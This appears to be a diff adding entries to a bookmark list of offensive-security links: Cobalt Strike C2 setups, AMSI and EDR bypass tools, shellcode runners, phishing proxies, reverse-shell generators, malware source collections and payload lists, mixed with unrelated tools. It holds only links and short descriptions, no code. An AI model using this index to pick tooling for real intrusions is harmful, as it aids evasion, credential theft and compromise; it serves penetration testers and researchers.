+https://github.com/GoSecure/dtd-finder/blob/698fd678f26395e1c7c097525f7182aecad0cd5f/list/xxe_payloads.md,XXE Payloads
+https://github.com/grufwub/shodan_fetcher,Just a simple (very much ToS breaking) tool to scrape information from Shodan pages.
+https://github.com/gtworek/PSBits/tree/master/NoRebootSvc,Prevent windows from shutdown or reboot example
+https://github.com/gtworek/PSBits/tree/master/VirtualAccounts,Run process as any user Virtual Accounts example
+https://github.com/guidovranken/vfuzz,previously called VrankenFuzz
+https://github.com/h0mbre/syscall,Just a hacky script to display calling conventions for syscalls for x86 and x86_64
+https://github.com/hackerhouse-opensource/exploits/blob/master/aix53l-lquerypv.c,AIX Priv esc poc
+https://github.com/hackerschoice/gsocket,Global Socket. Moving data from here to there. Securely  Fast and trough NAT/Firewalls  - hackerscho
+https://github.com/hacksysteam/HackSysExtremeVulnerableDriver,HackSys Extreme Vulnerable Windows Driver. Contribute to hacksysteam/HackSysExtremeVulnerableDriver 
+https://github.com/hahwul/dalfox,🦊 DalFox(Finder Of XSS) / Parameter Analysis and XSS Scanning tool based on golang - hahwul/dalfox
+https://github.com/hahwul/WebHackersWeapons,⚔️ Web Hacker's Weapons / A collection of cool tools used by Web hackers. Happy hacking   Happy bug-
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/ProcessColor.cna,Color cobalt process ps command output to highlight AV processes
+https://github.com/hasherezade/exe_to_dll,Converts a EXE into DLL. Contribute to hasherezade/exe_to_dll development by creating an account on 
+https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper,Allows for easy PE unmapping: useful in recovering executables dumped from the memory.
+https://github.com/hasherezade/pe-sieve,Scans a given process. Recognizes and dumps a variety of potentially malicious implants (replaced/in
+https://github.com/hasherezade/pe_to_shellcode,Converts PE into a shellcode. Contribute to hasherezade/pe_to_shellcode development by creating an a
+https://github.com/hausec/MaliciousClickOnceMSBuild,Basic C# Project that will take an MSBuild payload and run it with MSBuild via ClickOnce. - hausec/M
+https://github.com/hmgle/graftcp,A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy. - hmgle/graft
+https://github.com/hoanhan101/ultimate-go,Ultimate Go study guide  with heavily documented code and programs analysis  all in 1 place - hoanha
+https://github.com/hotnops/COM_Mapper,A tool to create COM class/interface relationships in neo4j - hotnops/COM_Mapper
+https://github.com/IAmStoxe/urlgrab,A golang utility to spider through a website searching for additional links. - IAmStoxe/urlgrab
+https://github.com/ihack4falafel/OSEE,Collection of things made during my preparation to take on OSEE - ihack4falafel/OSEE
+https://github.com/In3tinct/See-SURF,Python based scanner to find potential SSRF parameters - In3tinct/See-SURF
+https://github.com/infosecn1nja/Red-Teaming-Toolkit/blob/master/README.md,Red Teaming Resources
+https://github.com/infosecn1nja/SharpDoor,SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by 
+https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet,A cheat sheet that contains common enumeration and attack methods for Windows Active Directory. - In
+https://github.com/ioncodes/dbgmon,Allows you to parse all messages sent to DbgPrint without any process interaction. - ioncodes/dbgmon
+https://github.com/itm4n/VBA-RunPE,A VBA implementation of the RunPE technique or how to bypass application whitelisting. - itm4n/VBA-R
+https://github.com/its-a-feature/bifrost,Objective-C library and console to interact with Heimdal APIs for macOS Kerberos - its-a-feature/bif
+https://github.com/jaredhaight/scout,Scout is a .NET assembly used to perform recon on hosts during a pentest
+https://github.com/jordanbtucker/dpapick,DPAPI offline decryption utility. Contribute to jordanbtucker/dpapick development by creating an acc
+https://github.com/jpillora/chisel,A fast TCP/UDP tunnel over HTTP. Contribute to jpillora/chisel development by creating an account on
+https://github.com/jthuraisamy/SysWhispers2,AV/EDR evasion via direct system calls. Contribute to jthuraisamy/SysWhispers2 development by creati
+https://github.com/jthuraisamy/SysWhispers,AV/EDR evasion via direct system calls. Contribute to jthuraisamy/SysWhispers development by creatin
+https://github.com/junnlikestea/bulkssrf,Tests for SSRF by injecting a specified location into different headers. This is a Rust port of m4ll
+https://github.com/jymcheong/AutoTTP,Automated Tactics Techniques & Procedures. Re-running complex sequences manually for regression tests
+https://github.com/KathanP19/Gxss,A tool to check a bunch of URLs that contain reflecting params. - KathanP19/Gxss
+https://github.com/Kevin-Robertson/InveighZero/blob/master/README.md,InveighZero is a C# LLMNR/NBNS/mDNS/DNS/DHCPv6 spoofer and man-in-the-middle tool designed to assist penetration testers/red teamers that find themselves limited to a Windows system.
+https://github.com/kgretzky/evilginx2,Standalone man-in-the-middle attack framework used for phishing login credentials along with session
+https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh,Cobalt Strike https c2 setup script
+https://github.com/kmkz/Pentesting/blob/master/Post-Exploitation-Cheat-Sheet,Post Exploitation cheat sheet
+https://github.com/kyleavery/WMIEnum,Enumerate Windows hosts with WMI. Contribute to kyleavery/WMIEnum development by creating an account
+https://github.com/l0ss/Snaffler-1,a tool for pentesters to help find delicious candy  by @l0ss and @Sh3r4 ( Twitter: @/mikeloss and @/
+https://github.com/lc/subjs,Fetches javascript file from a list of URLS or subdomains. - lc/subjs
+https://github.com/leechristensen/SpoolSample,PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface.  This
+https://github.com/leonjza/tc2/tree/master/cobaltstrike,A cobaltstrike docker-compose setup, using Traefik to front the server's ports.
+https://github.com/lesnuages/hershell,Golang implant
+https://github.com/lexfo/rpc2socks,Post-exploit tool that enables a SOCKS tunnel via a Windows host using an extensible custom RPC prot
+https://github.com/lightspin-tech/red-kube,Red Team KubeCTL Cheat Sheet. Contribute to lightspin-tech/red-kube development by creating an accou
+https://github.com/LloydLabs/wsb-detect,wsb-detect enables you to detect if you are running in Windows Sandbox ("WSB") - LloydLabs/wsb-detec
+https://github.com/lordsaibat/SendKeys,A deployable tool to send key input per command line. - lordsaibat/SendKeys
+https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/ssrf.py,Server Side Req Forgery testing tool
+https://github.com/m4ll0k/BurpSuite-Secret_Finder,Burp Suite extension to discover apikeys/accesstokens and sensitive data  from HTTP response. - m4ll
+https://github.com/m4ll0k/CastleBravo,CastleBravo - BugBounty Automation Tool . Contribute to m4ll0k/CastleBravo development by creating a
+https://github.com/m4ll0k/SecretFinder,SecretFinder - A python script for find sensitive data (apikeys  accesstoken jwt ..) and search anyt
+https://github.com/mame82/UnifyingVulnsDisclosureRepo,Logitech Unifying technology Vulns Repo
+https://github.com/mandatoryprogrammer/CursedChrome,Chrome-extension implant that turns victim Chrome browsers into fully-functional HTTP proxies  allow
+https://github.com/marco-lancini/goscan,Interactive Network Scanner. Contribute to marco-lancini/goscan development by creating an account o
+https://github.com/matterpreter/DefenderCheck,Identifies the bytes that Microsoft Defender flags on. - matterpreter/DefenderCheck
+https://github.com/matterpreter/OffensiveCSharp/blob/master/README.md,Great C# Post Exploitation tools
+https://github.com/mdsecactivebreach/o365-attack-toolkit,A toolkit to attack Office365. Contribute to mdsecactivebreach/o365-attack-toolkit development by cr
+https://github.com/med0x2e/ExecuteAssembly,Load/Inject .NET assemblies by; reusing the host (spawnto) process loaded CLR AppDomainManager  Stom
+https://github.com/med0x2e/NET-Assembly-Inject-Remote,.NET assembly local/remote loading/injection into memory. - med0x2e/NET-Assembly-Inject-Remote
+https://github.com/med0x2e/NoAmci,Using DInvoke to patch AMSI.dll in order to bypass AMSI detections triggered when loading .NET trade
+https://github.com/michelin/ChopChop,ChopChop is a command-line tool for dynamic application security testing on web applications
+https://github.com/microsoft/Windows-classic-samples/tree/master/Samples,This repo contains samples that demonstrate the API used in Windows classic desktop applications
+https://github.com/mlgualtieri/NTLMRawUnHide/blob/master/README.md,NTLMRawUnhide.py is a Python3 script designed to parse network packet capture files and extract NTLMv2 hashes in a crackable format.
+https://github.com/monoxgas/sRDI,Shellcode implementation of Reflective DLL Injection. Convert DLLs to position independent shellcode
+https://github.com/moohax/xllpoc,Code Exec via Excel. Contribute to moohax/xllpoc development by creating an account on GitHub.
+https://github.com/Mrakovic-ORG/NashaVM,Nasha is a Virtual Machine for .NET files and its runtime was made in C++/CLI - Mrakovic-ORG/NashaVM
+https://github.com/Mr-B0b/SpaceRunner,This tool enables the compilation of a C# program that will execute arbitrary PowerShell code  witho
+https://github.com/n0pe-sled/Postfix-Server-Setup,Postfix Server setup
+https://github.com/namazso/physmem_drivers,A collection of various vulnerable (mostly physical memory exposing) drivers. - namazso/physmem_driv
+https://github.com/natlas/cyclicprng,A cyclic PRNG implementation.
+https://github.com/nccgroup/SocksOverRDP,Socks5 Proxy support for Remote Desktop Protocol / Terminal Services - nccgroup/SocksOverRDP
+https://github.com/Ne0nd0g/go-shellcode,A repository of Windows Shellcode runners and supporting utilities. The applications load and execut
+https://github.com/neex/phuip-fpizdam,This is an exploit for a bug in php-fpm (CVE-2019-11043)
+https://github.com/Neo23x0/Raccine,A Simple Ransomware Vaccine. Contribute to Neo23x0/Raccine development by creating an account on Git
+https://github.com/netspooky/pdiff,Binary Protocol Differ. Contribute to netspooky/pdiff development by creating an account on GitHub.
+https://github.com/ngalongc/bug-bounty-reference,Inspired by https://github.com/djadmin/awesome-bug-bounty  a list of bug bounty write-up that is cat
+https://github.com/noobexploiter/headerssrfXD,Scan ssrf on headers. Inspired by the tool https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/ss
+https://github.com/nsonaniya2010/SubDomainizer,A tool to find subdomains and interesting things hidden inside  external Javascript files of page  f
+https://github.com/odedshimon/BruteShark,Network Analysis Tool. Contribute to odedshimon/BruteShark development by creating an account on Git
+https://github.com/odzhan/injection,Windows process injection methods. Contribute to odzhan/injection development by creating an account
+https://github.com/off-world/PSMemory,Automation Capable Multi Search 64 Bit Windows Memory Scanner - off-world/PSMemory
+https://github.com/ollypwn/CVE-2020-0601,CurveBall Poc
+https://github.com/OpenRCE/paimei,A reverse engineering framework written in Python. - OpenRCE/paimei
+https://github.com/open-sdr/openwifi,open-source IEEE802.11/Wi-Fi baseband chip/FPGA design - open-sdr/openwifi
+https://github.com/opsdisk/pagodo,pagodo (Passive Google Dork) - Automate Google Hacking Database scraping - opsdisk/pagodo
+https://github.com/optiv/Talon,A password guessing tool that targets the Kerberos and LDAP services within the Windows Active Direc
+https://github.com/outflanknl/Ps-Tools,Ps-Tools  an advanced process monitoring toolkit for offensive operations - outflanknl/Ps-Tools
+https://github.com/outflanknl/RedELK,Red Team's SIEM - tool for Red Teams used for tracking and alarming about Blue Team activities as we
+https://github.com/OWASP/CheatSheetSeries/tree/master/cheatsheets,Cheat Sheets
+https://github.com/parsiya/Hacking-with-Go,Golang for Security Professionals. Contribute to parsiya/Hacking-with-Go development by creating an 
+https://github.com/phanan/htaccess,✂A collection of useful .htaccess snippets. Contribute to phanan/htaccess development by creating an
+https://github.com/phra/PEzor,Open-Source PE Packer. Contribute to phra/PEzor development by creating an account on GitHub.
+https://github.com/pion/webrtc,Pure Go implementation of the WebRTC API. Contribute to pion/webrtc development by creating an accou
+https://github.com/pipxproject/pipx,Install and Run Python Applications in Isolated Environments - pipxproject/pipx
+https://github.com/poppoptrex/vuln_uris/blob/master/uris.txt,Vuln Uris
+https://github.com/PortSwigger/autorize,Autorize is an automatic authorization enforcement detection extension for Burp Suite
+https://github.com/postrequest/xeca,PowerShell payload generator. Contribute to postrequest/xeca development by creating an account on G
+https://github.com/projectdiscovery/httpx,httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp lib
+https://github.com/projectdiscovery/notify,Notify is a helper utility written in Go that allows you to pull results from burp collaborator inst
+https://github.com/projectdiscovery/nuclei,Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensi
+https://github.com/projectdiscovery,Security Through Intelligent Automation. ProjectDiscovery has 13 repositories available. Follow thei
+https://github.com/proxycannon/proxycannon-ng,A private botnet using multiple cloud environments for pentesters and red teamers. - Built by the co
+https://github.com/pry0cc/axiom,A dynamic infrastructure toolkit for red teamers and bug bounty hunters! - pry0cc/axiom
+https://github.com/pry0cc/cloud-ranges,A list of cloud ranges from different providers. Contribute to pry0cc/cloud-ranges development by cr
+https://github.com/qtc-de/container-arsenal,A small arsenal of useful docker containers and a script to easy start  stop and manage them. - qtc-
+https://github.com/quahac/burp-intruder-hashcat-maskprocessor,Contribute to quahac/burp-intruder-hashcat-maskprocessor development by creating an account on GitHu
+https://github.com/RandomRobbieBF/phpunit-brute,Tool to try multiple paths for PHPunit RCE CVE-2017-9841 - RandomRobbieBF/phpunit-brute
+https://github.com/ranman/WhereML,Contribute to ranman/WhereML development by creating an account on GitHub.
+https://github.com/rasta-mouse/ThreatCheck,Identifies the bytes that Microsoft Defender  / AMSI Consumer flags on. - rasta-mouse/ThreatCheck
+https://github.com/rbowen/mod_rewrite_book,mod_rewrite book. Contribute to rbowen/mod_rewrite_book development by creating an account on GitHub
+https://github.com/rclone/rclone,"rsync for cloud storage" - Google Drive  Amazon Drive  S3  Dropbox  Backblaze B2  One Drive  Swift 
+https://github.com/realoriginal/beacon-object-file,Template Project Conforming to Beacon's Object File Format ( BOF ) Using Makefile  and Mingw-w64 com
+https://github.com/realoriginal/bof-NetworkServiceEscalate,Abuses the Shared Logon Session ID Issue (Described [here](https://www.tiraniddo.dev/2020/04/sharing
+https://github.com/realoriginal,Well then. You've found me. realoriginal has 20 repositories available. Follow their code on GitHub.
+https://github.com/redcode-labs/Coldfire,Golang malware development library. Contribute to redcode-labs/Coldfire development by creating an a
+https://github.com/rhaidiz/broxy,An HTTP/HTTPS intercept proxy written in Go. Contribute to rhaidiz/broxy development by creating an 
+https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation,A centralized source of all AWS IAM privilege escalation methods released by Rhino Security Labs. - 
+https://github.com/RihaMaheshwari/OSCP-Preparation-Material/blob/master/ReadMe.md,OSCP Resources
+https://github.com/RikunjSindhwad/ProxyJacker,A tool for creating proxy dll for hijacking . Contribute to RikunjSindhwad/ProxyJacker development b
+https://github.com/rmdavy/HeapsOfFun,AMSI Bypass Via the Heap. Contribute to rmdavy/HeapsOfFun development by creating an account on GitH
+https://github.com/robotastic/trunk-recorder,Records calls from a Trunked Radio System (P25 & SmartNet) - robotastic/trunk-recorder
+https://github.com/rvrsh3ll/BOF_Collection,Various Cobalt Strike BOFs. Contribute to rvrsh3ll/BOF_Collection development by creating an account
+https://github.com/rvrsh3ll/MSBuildAPICaller,MSBuild Without MSBuild.exe. Contribute to rvrsh3ll/MSBuildAPICaller development by creating an acco
+https://github.com/rxwx/spoolsystem,Print Spooler Named Pipe Impersonation for Cobalt Strike - rxwx/spoolsystem
+https://github.com/ryanmcdermott/clean-code-javascript,:bathtub: Clean Code concepts adapted for JavaScript - ryanmcdermott/clean-code-javascript
+https://github.com/s0md3v/Arjun,HTTP parameter discovery suite. Contribute to s0md3v/Arjun development by creating an account on Git
+https://github.com/s0md3v/AwesomeXSS,Collection of xss resources
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet,A cheat sheet that contains common enumeration and attack methods for Windows Active Directory. - S1
+https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell,This repo contains some Amsi Bypass methods i found on different Blog Posts. - S3cur3Th1sSh1t/Amsi-B
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack,Contribute to S3cur3Th1sSh1t/PowerSharpPack development by creating an account on GitHub.
+https://github.com/SadProcessor/CypherDog,PoSh BloodHound Dog Whisperer. Contribute to SadProcessor/CypherDog development by creating an accou
+https://github.com/sailay1996/awesome_windows_logical_bugs,collect for learning cases. Contribute to sailay1996/awesome_windows_logical_bugs development by cre
+https://github.com/salesforce/jarm,Contribute to salesforce/jarm development by creating an account on GitHub.
+https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/tree/master/Privilege%20Escalation,windows events samples associated to specific attack and post-exploitation techniques
+https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES,Windows Events Attack Samples. Contribute to sbousseaden/EVTX-ATTACK-SAMPLES development by creating
+https://github.com/sc0tfree/updog,Updog is a replacement for Python's SimpleHTTPServer. It allows uploading and downloading via HTTP/S
+https://github.com/schollz/find-lf,Track the location of every Wi-Fi device (:iphone:) in your house using Raspberry Pis and FIND - sch
+https://github.com/scipag/PowerShellUtilities,PowerShellUtilities provides various utility commandlets. - scipag/PowerShellUtilities
+https://github.com/seb1055/AWS-Loot,Pull secrets from an AWS environment . Contribute to seb1055/AWS-Loot development by creating an acc
+https://github.com/SecIdiot/Beacon,Open Source Cobalt Strike Beacon. Unreleased  in research stages. - SecIdiot/Beacon
+https://github.com/SecIdiot/CobaltPatch,Cobalt Strike Malleable Profile Inline Patch Template: A Position Independent Code (PIC) Code Templa
+https://github.com/securesean/DecryptAutoLogon,Command line tool to extract/decrypt the password that was stored in the LSA by SysInternals AutoLog
+https://github.com/sensepost/go-out,☄️go-out - A Golang egress buster. Contribute to sensepost/go-out development by creating an account
+https://github.com/sensepost/ruler,A tool to abuse Exchange services. Contribute to sensepost/ruler development by creating an account 
+https://github.com/SerpicoProject/Serpico,SimplE RePort wrIting and COllaboration tool. Contribute to SerpicoProject/Serpico development by cr
+https://github.com/sevagas/swap_digger/blob/master/README.md,swap_digger is a bash script used to automate Linux swap analysis for post-exploitation (think linux mimikatz kinda)
+https://github.com/sh4hin/GoPurple,Yet another shellcode runner consists of different techniques for evaluating detection capabilities 
+https://github.com/shazow/ssh-chat,Chat over SSH. Contribute to shazow/ssh-chat development by creating an account on GitHub.
+https://github.com/Shivangx01b/BountyIt,A fuzzer made in golang for finding issues like xss  lfi  rce  ssti...that detects issues using chan
+https://github.com/shunf4/proxychains-windows,Windows and Cygwin port of proxychains  based on MinHook and DLL Injection - shunf4/proxychains-wind
+https://github.com/skelsec/msldap,LDAP library for auditing MS AD. Contribute to skelsec/msldap development by creating an account on 
+https://github.com/slaeryan/AQUARMOURY/tree/master/Shellycoat,Utility designed to aid in bypassing User-Mode hooks utilised by AV/NGAV/EDR/Sandboxes/DLP
+https://github.com/slaeryan/MIDNIGHTTRAIN,Covert Stage-3 Persistence Framework. Contribute to slaeryan/MIDNIGHTTRAIN development by creating a
+https://github.com/smaranchand/bucky,Bucky (An automatic S3 bucket discovery tool). Contribute to smaranchand/bucky development by creati
+https://github.com/SnaffCon/Snaffler,a tool for pentesters to help find delicious candy  by @l0ss and @Sh3r4 ( Twitter: @/mikeloss and @/
+https://github.com/snyk/exploit-workshop,A step by step workshop to exploit various vulnerabilities in Node.js and Java applications - snyk/e
+https://github.com/solemnwarning/rehex,Reverse Engineers' Hex Editor. Contribute to solemnwarning/rehex development by creating an account 
+https://github.com/spyx/monkey-shell/blob/master/monkey-shell.sh,This script will generate your reverse shell options with proper IP address and port.(Linux)
+https://github.com/sq5bpf/etherify,Etherify - bringing the ether back to ethernet. Contribute to sq5bpf/etherify development by creatin
+https://github.com/Static-Flow/BurpSuite-Team-Extension,This Burpsuite plugin allows for multiple web app testers to share their proxy history with each oth
+https://github.com/sud0woodo/DCOMrade,Powershell script for enumerating vulnerable DCOM Applications - sud0woodo/DCOMrade
+https://github.com/Sw4mpf0x/PowerLurk,Malicious WMI Events using PowerShell. Contribute to Sw4mpf0x/PowerLurk development by creating an a
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources,Pentesting Methodology and Resources
+https://github.com/teh-cmc/go-internals/blob/master/chapter1_assembly_primer/README.md,A Primer on Go Assembly
+https://github.com/terjanq/Tiny-XSS-Payloads,A collection of tiny XSS Payloads that can be used in different contexts. - terjanq/Tiny-XSS-Payload
+https://github.com/tevora-threat/SharpView,C# implementation of harmj0y's PowerView. Contribute to tevora-threat/SharpView development by creat
+https://github.com/thalium/icebox,Virtual Machine Introspection  Tracing & Debugging - thalium/icebox
+https://github.com/thelinuxchoice/hmmcookies,Grab cookies from Firefox  Chrome  Opera using a shortcut file (bypass UAC) - thelinuxchoice/hmmcook
+https://github.com/TheSecondSun/GoSH,Golang reverse/bind shell generator. Contribute to TheSecondSun/GoSH development by creating an acco
+https://github.com/thiagomayllart/Harvis,Harvis is designed to automate your C2 Infrastructure. - thiagomayllart/Harvis
+https://github.com/threatexpress/malleable-c2/blob/c3385e481159a759f79b8acfe11acf240893b830/jquery-c2.4.2.profile,Cobalt Strike Malleable C2 example
+https://github.com/threatexpress/malleable-c2,Cobalt Strike Malleable C2 Design and Reference Guide - threatexpress/malleable-c2
+https://github.com/tomcarver16/ADSearch,A tool to help query AD via the LDAP protocol. Contribute to tomcarver16/ADSearch development by cre
+https://github.com/tomer8007/chromium-ipc-sniffer,A tool to capture communication between Chromium processes on Windows - tomer8007/chromium-ipc-sniff
+https://github.com/tomnomnom/anew,A tool for adding new lines to files  skipping duplicates - tomnomnom/anew
+https://github.com/tothi/dll-hijack-by-proxying,Exploiting DLL Hijacking by DLL Proxying Super Easily - tothi/dll-hijack-by-proxying
+https://github.com/trekhleb/javascript-algorithms,📝 Algorithms and data structures implemented in JavaScript with explanations and links to further re
+https://github.com/trustedsec/CS-Situational-Awareness-BOF,Contribute to trustedsec/CS-Situational-Awareness-BOF development by creating an account on GitHub.
+https://github.com/trustedsec/CS-Situational-Awareness-BOF/tree/master/SA,Cobalt Strike Situational Awareness BOF
+https://github.com/trustedsec/physical-docs/blob/master/MSA_Language_v1.txt,CYA Legal doc for Physical Pentest
+https://github.com/trustedsec/tscopy,Contribute to trustedsec/tscopy development by creating an account on GitHub.
+https://github.com/trustedsec/unicorn,Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into 
+https://github.com/ufrisk/MemProcFS,The Memory Process File System. Contribute to ufrisk/MemProcFS development by creating an account on
+https://github.com/unixpickle/gobfuscate,Obfuscate Go binaries and packages. Contribute to unixpickle/gobfuscate development by creating an a
+https://github.com/UnkL4b/BabyShark,Basic C2 Server. Contribute to UnkL4b/BabyShark development by creating an account on GitHub.
+https://github.com/UnkL4b/GitMiner,Tool for advanced mining for content on Github. Contribute to UnkL4b/GitMiner development by creatin
+https://github.com/unprovable/PentestHardware,Hardware pentesting notes
+https://github.com/ustayready/SharpHose,Asynchronous Password Spraying Tool in C# for Windows Environments - ustayready/SharpHose
+https://github.com/Vector35/binaryninja-api,Public API  examples  documentation and issues for Binary Ninja - Vector35/binaryninja-api
+https://github.com/Velocidex/velociraptor,Velociraptor is a tool for collecting host based state information using Velocidex Query Language
+https://github.com/Velocidex/WinPmem,The multi-platform memory acquisition tool. Contribute to Velocidex/WinPmem development by creating 
+https://github.com/vxunderground/MalwareSourceCode,Collection of malware source code for a variety of platforms in an array of different programming la
+https://github.com/vxunderground/MalwareSourceCode/tree/main/PHP,PHP Malware source code
+https://github.com/vxunderground/VXUG-Papers,Research code & papers from members of vx-underground. - vxunderground/VXUG-Papers
+https://github.com/vysecurity/IPFuscator,IPFuscator - A tool to automatically generate alternative IP representations - vysecurity/IPFuscator
+https://github.com/wbenny/injdrv,proof-of-concept Windows Driver for injecting DLL into user-mode processes using APC - wbenny/injdrv
+https://github.com/wcventure/FuzzingPaper,Recent Fuzzing Paper. Contribute to wcventure/FuzzingPaper development by creating an account on Git
+https://github.com/westonruter/pantheon-documentation/blob/master/source/docs/articles/sites/fastly-domain-masking.md,Fastly Domain Fronting
+https://github.com/wetw0rk/AWAE-PREP,This repository will serve as the "master" repo containing all trainings and tutorials done in prepe
+https://github.com/whickey-r7/grab_beacon_config,Grabs cobalt strike beacon configuration
+https://github.com/wintrmvte/SNOWCRASH,A polyglot payload generator. Contribute to wintrmvte/SNOWCRASH development by creating an account o
+https://github.com/wireghoul/graudit,grep rough audit - source code auditing tool. Contribute to wireghoul/graudit development by creatin
+https://github.com/x0r19x91/UnAutoIt,The Cross Platform AutoIt Extractor. Contribute to x0r19x91/UnAutoIt development by creating an acco
+https://github.com/xChockax/Practical-Ethical-Hacking---The-Complete-Course-Notes-and-Resources-,Practical Ethical Hacking - The Complete Course (Notes and Resources)   - xChockax/Practical-Ethical
+https://github.com/xforcered/StandIn,StandIn is a small .NET35/45 AD post-exploitation toolkit - xforcered/StandIn
+https://github.com/XiphosResearch/netelf,Run executables from memory  over the network  on Windows  Linux  OpenVMS... routers... spaceships..
+https://github.com/xmendez/wfuzz,Web application fuzzer. Contribute to xmendez/wfuzz development by creating an account on GitHub.
+https://github.com/xwings/tuya/blob/master/talks/mousejack/logitech%20firmware/RQR_012_005_00028.hex,Logitec Vulnerable Firmware
+https://github.com/Yaxser/CobaltStrike-BOF,Collection of beacon BOF written to learn windows and cobaltstrike - Yaxser/CobaltStrike-BOF
+https://github.com/yeyintminthuhtut/Awesome-Red-Teaming/blob/master/README.md,List of Awesome Red Team / Red Teaming Resources
+https://github.com/yoava333/presentations/blob/master/Fuzzing%20the%20Windows%20Kernel%20-%20OffensiveCon%202020.pdf,Fuzzing the Windows Kernel
+https://github.com/yogeshojha/rengine,reNgine is an automated reconnaissance framework meant for gathering information during penetration 
+https://github.com/zodiacon/AllTools,bunch of windows tools
+https://glimpse-editor.org/,Glimpse Image Editor. Glimpse is an open source image editor based on the GNU Image Manipulation Pro
+https://gofile.io/?t=welcome,Gofile is a free and anonymous file-sharing platform. You can store and share data of all types (fil
+https://gomakethings.com/working-with-xhr-response-data-in-vanilla-js/,Yesterday  we looked at how to use XHR (XMLHttpRequest()’s) to get data from APIs with vanilla JavaS
+https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html,Posted by James Forshaw  Google Project Zero     At Recon Montreal 2018 I presented “Unknown Known D
+https://grpc.io/,A high-performance  open source universal RPC framework
+https://h0mbre.github.io/Fuzzing-Like-A-Caveman-4/,IntroductionLast time we blogged  we had a dumb fuzzer that would test an intentionally vulnerable p
+https://h0mbre.github.io/Fuzzing-Like-A-Caveman/,IntroductionI’ve been passively consuming a lot of fuzzing-related material in the last few months a
+http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/,Windows Reverse Shell Shellcode I. Windows Reverse Shell Shellcode I. November 22  2015 elcapitan · 
+https://hacks.mozilla.org/2020/04/fuzzing-with-webidl/,Fuzzing Firefox with WebIDL
+https://haggis-m.medium.com/malleable-c2-profiles-and-you-7c7ab43e7929,Malleable C2 Profiles and You
+https://hakin9.org/buster-an-advanced-tool-for-email-reconnaissance/,Buster is an advanced OSINT tool used to:       	Get social accounts of an email using multiple sour
+https://hakin9.org/maryam-open-source-intelligenceosint-framework/,OWASP Maryam is an Open-source intelligence(OSINT) and Web-based Footprinting modular/tool framework
+https://hakin9.org/rdpthief-extracting-clear-text-passwords-from-mstsc-exe-using-api-hooking/,RdpThief by itself is a standalone DLL that when injected in the mstsc.exe process  will perform API
+https://hansesecure.de/2019/08/from-awae-to-oswe-the-preperation-guide/?lang=en,As promised on Twitter this post will document my steps through the OSWE exam preperation. Searching
+https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/,Tales of a Red Teamer: How to setup a C2 infrastructure for Cobalt Strike – UB 2018
+https://httpd.apache.org/docs/2.4/rewrite/flags.html,Introduction. A RewriteRule can have its behavior modified by one or more flags. Flags are included 
+https://hunter2.gitbook.io/darthsidious/privilege-escalation/token-impersonation,Token Impersonation techniques
+https://hwiegman.home.xs4all.nl/desktopini.html,Information about DESKTOP.INI with list of keywords  tips  examples and virus advice
+https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html,A second look at the arcane art of shellcode writing
+https://ihack4falafel.github.io/Hooking-CreateProcessWithLogonW-with-Frida/,IntroductionFollowing b33f most recent Patreon session titled RDP hooking from POC to PWN where he t
+https://ihack4falafel.github.io/Offensive-Security-AWEOSEE-Review/,IntroductionThis writeup is aimed at folks who are contemplating preparing to take on the AWE course
+https://insiderphd.dev/tools/ffuf.html,ffuf translator. This is a simple tool which helps newbies understand the results of ffuf! Paste you
+https://insinuator.net/2018/12/ernw-whitepaper-67-active-directory-trust-considerations/,ERNW Whitepaper 67: Active Directory Trust Considerations
+https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/,How to break out of restricted shells with tcpdump
+https://institute.sektor7.net/rto-maldev-intermediate,More advanced malware development techniques in Windows  including: API hooking  32-/64-bit migratio
+https://ired.team/,Great Red Teaming Resource
+https://ired.team/offensive-security/code-injection-process-injection/injecting-and-executing-.net-assemblies-to-unmanaged-process,Injecting and executing .Net assemblies to unmanaged process
+https://ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy,ProcessDynamicCodePolicy: Arbitrary Code Guard (ACG)
+https://ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time,Retrieving ntdll Syscall Stubs from Disk at Run-time
+https://ired.team/offensive-security/enumeration-and-discovery/enumerating-com-objects-and-their-methods,Enumerating COM Objects and their Methods
+https://ired.team/offensive-security/lateral-movement,Lateral Movement methods
+https://ired.team/offensive-security/persistence,Persistence methods
+https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/,In this post  I’ll discuss an arbitrary file move vulnerability I found in Windows Service Tracing. 
+https://itm4n.github.io/cve-2020-1170-windows-defender-eop/,Here is my writeup about CVE-2020-1170  an elevation of privilege bug in Windows Defender. Finding a
+https://itm4n.github.io/windows-registry-rpceptmapper-eop/,Windows RpcEptMapper Service Insecure Registry Permissions EoP
+https://itnext.io/java-rmi-for-pentesters-structure-recon-and-communication-non-jmx-registries-a10d5c996a79,The purpose of this article is to explain to you  what are RMI interfaces you might encounter during
+https://ivanitlearning.wordpress.com/2018/10/13/windows-32-bit-shellcoding-101/,(Windows 32-bit) Shellcoding 101
+https://iwantmore.pizza/posts/amsi.html,Antimalware Scan Interface (AMSI) — A Red Team Analysis on Evasion
